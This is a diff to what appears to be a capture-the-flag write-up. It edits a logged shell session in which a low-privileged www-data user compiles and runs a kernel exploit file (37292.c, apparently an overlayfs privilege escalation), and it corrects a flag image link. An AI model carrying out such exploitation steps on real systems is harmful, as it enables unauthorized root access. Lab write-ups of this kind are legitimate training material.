@@ -344,7 +344,8 @@ www-data@ubuntu:/tmp/exploit$ nano 37292.c
 
 Error writing /var/www/.nano_history: Permission denied
 www-data@ubuntu:/tmp/exploit$ cat 37292.c | grep "gcc"
-user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+# user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+www-data@ubuntu:/tmp/exploit$ cc 37292.c -o ofs
 www-data@ubuntu:/tmp/exploit$ ./ofs
 spawning threads
 mount #1
@@ -376,4 +377,4 @@ If you captured this make sure to go here.....
 /006-final/xvf7-flag/
 
 ```
-![Flag](images/flag.txt)
+![Flag](images/flag.png)
